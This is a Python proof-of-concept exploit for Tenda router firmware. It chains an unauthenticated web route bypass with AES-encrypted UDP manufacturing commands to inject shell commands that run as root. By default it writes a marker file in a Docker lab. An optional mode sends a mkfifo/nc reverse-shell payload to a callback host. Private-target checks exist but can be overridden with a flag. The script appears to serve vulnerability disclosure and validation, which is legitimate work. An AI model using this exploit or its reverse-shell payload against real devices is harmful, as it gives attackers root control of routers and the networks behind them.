#!/usr/bin/env python3
"""
PoC: unauthenticated ATE UDP ifconfig command injection.

The web auth-bypass route /goform/ate%00.js starts td_ate. That daemon binds
UDP/7329 and accepts AES-128-CBC encrypted manufacturing commands. The
ifconfig handler prepends "ifconfig" to attacker-controlled text and executes
the resulting string with system().

By default this PoC uses a harmless marker file. Pass --reverse-shell to launch
the same BusyBox sh/nc FIFO reverse shell that was validated in the lab.
"""

import argparse
import ipaddress
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


KEY_HEX = "54656e6461303132333435363738394d"  # Tenda0123456789M
IV_HEX = "00000000000000000000000000000000"
MARKER = "/tmp/ate_ifconfig_poc"
RS_FIFO = "/tmp/ate_rs_fifo"


def require_private_host(host, allow_nonlocal):
    ip = ipaddress.ip_address(socket.gethostbyname(host))
    if not allow_nonlocal and not (ip.is_loopback or ip.is_private):
        raise SystemExit(f"refusing non-private target {ip}; pass --allow-nonlocal for authorized testing")
    return str(ip)


def require_private_target(base_url, allow_nonlocal):
    host = urllib.parse.urlparse(base_url).hostname
    require_private_host(host, allow_nonlocal)


def docker_out(args):
    return subprocess.run(args, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False).stdout.strip()


def docker_sh(container, command):
    return subprocess.run(
        ["docker", "exec", container, "/bin/sh", "-c", command],
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    ).stdout


def firmware_root_expr():
    return 'pid=$(ps | awk \'/[h]ttpd/{print $1; exit}\'); root=$(readlink /proc/$pid/root); '


def discover_ip(container):
    ip = docker_out(["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", container])
    if not ip:
        raise SystemExit(f"could not discover Docker IP for {container}; pass --ate-host")
    return ip


def request(base_url, path):
    req = urllib.request.Request(base_url.rstrip("/") + path, method="GET")

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None

    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=4) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers), exc.read()
    except urllib.error.URLError as exc:
        return 0, {}, str(exc).encode()


def openssl_crypt(data, decrypt=False):
    cmd = ["openssl", "enc", "-aes-128-cbc", "-K", KEY_HEX, "-iv", IV_HEX, "-nopad", "-nosalt"]
    if decrypt:
        cmd.insert(2, "-d")
    proc = subprocess.run(cmd, input=data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
    if proc.returncode != 0:
        raise SystemExit(proc.stderr.decode(errors="replace"))
    return proc.stdout


def encrypt_command(command):
    data = command.encode()
    padded_len = ((max(1, len(data)) + 15) // 16) * 16
    return openssl_crypt(data + b"\0" * (padded_len - len(data)))


def decrypt_response(data):
    return openssl_crypt(data, decrypt=True).rstrip(b"\0").decode(errors="replace")


def send_ate_command(host, port, command):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(3)
        sock.sendto(encrypt_command(command), (host, port))
        data, _ = sock.recvfrom(4096)
    return decrypt_response(data)


def cleanup(container, kill_ate):
    cmd = firmware_root_expr() + f'rm -f "$root{MARKER}"; '
    if kill_ate:
        cmd += 'for p in $(ps | awk \'/[t]d_ate/{print $1}\'); do kill -9 "$p" 2>/dev/null || true; done'
    docker_sh(container, cmd)


def reverse_shell_payload(callback_ip, callback_port):
    return (
        f"ifconfig ;rm -f {RS_FIFO};"
        f"mkfifo {RS_FIFO};"
        f"/bin/sh -i < {RS_FIFO} 2>&1 | /usr/bin/nc {callback_ip} {callback_port} > {RS_FIFO} & #"
    )


def reverse_connection_evidence(container, callback_port):
    cmd = f"ss -tnp 2>/dev/null | grep ':{callback_port} ' || true"
    return docker_sh(container, cmd).strip()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://127.0.0.1:18080")
    parser.add_argument("--container", default="tenda-b104-native-httpd")
    parser.add_argument("--ate-host", default="")
    parser.add_argument("--ate-port", type=int, default=7329)
    parser.add_argument("--reverse-shell", action="store_true", help="launch /bin/sh -i back to --callback-host:--callback-port")
    parser.add_argument("--callback-host", default="172.17.0.1", help="host/IP reachable from the firmware container")
    parser.add_argument("--callback-port", type=int, default=5555)
    parser.add_argument("--no-cleanup", action="store_true")
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()

    require_private_target(args.target, args.allow_nonlocal)
    if not args.ate_host:
        args.ate_host = discover_ip(args.container)
    args.ate_host = require_private_host(args.ate_host, args.allow_nonlocal)
    callback_ip = require_private_host(args.callback_host, args.allow_nonlocal)

    cleanup(args.container, kill_ate=True)

    baseline_status, baseline_headers, _ = request(args.target, "/goform/ate")
    exploit_status, _, exploit_body = request(args.target, "/goform/ate%00.js")
    time.sleep(1)

    if args.reverse_shell:
        payload = reverse_shell_payload(callback_ip, args.callback_port)
    else:
        payload = f"ifconfig ;echo ATE_IFCONFIG_POC>{MARKER};#"

    response = ""
    error = ""
    try:
        response = send_ate_command(args.ate_host, args.ate_port, payload)
    except Exception as exc:
        error = str(exc)

    marker = ""
    connection = ""
    if args.reverse_shell:
        for _ in range(10):
            connection = reverse_connection_evidence(args.container, args.callback_port)
            if connection:
                break
            time.sleep(0.5)
        vulnerable = bool(connection)
    else:
        marker = docker_sh(args.container, firmware_root_expr() + f'cat "$root{MARKER}" 2>/dev/null || true').strip()
        vulnerable = marker == "ATE_IFCONFIG_POC"

    print("[baseline] GET /goform/ate")
    print(f"  status={baseline_status} location={baseline_headers.get('Location', '')}")
    print("[exploit] GET /goform/ate%00.js")
    print(f"  status={exploit_status} body={exploit_body[:120]!r}")
    print(f"[ate] UDP {args.ate_host}:{args.ate_port}")
    print(f"  command={payload!r}")
    if response:
        print(f"  response={response!r}")
    if error:
        print(f"  error={error!r}")
    if args.reverse_shell:
        print(f"[validation] reverse shell {callback_ip}:{args.callback_port}")
        print("  connection=" + repr(connection))
    else:
        print(f"[validation] marker={MARKER}")
        print(f"  marker={marker!r}")
    print("  vulnerable=" + str(vulnerable))
    if vulnerable:
        print("  evidence: unauthenticated web request starts td_ate; encrypted UDP command reaches root system() sink")
        if args.reverse_shell:
            print("  shell: /bin/sh -i is connected through /usr/bin/nc and a FIFO")
        print("  cvss evidence: AV:N/AC:L/PR:N/UI:N; root command execution when web UI and UDP/7329 are reachable")

    if not args.no_cleanup:
        cleanup(args.container, kill_ate=True)
        print("[cleanup] removed marker and killed spawned td_ate")
        if args.reverse_shell:
            print("[cleanup] reverse-shell process is intentionally not killed")

    sys.exit(0 if vulnerable else 1)


if __name__ == "__main__":
    main()
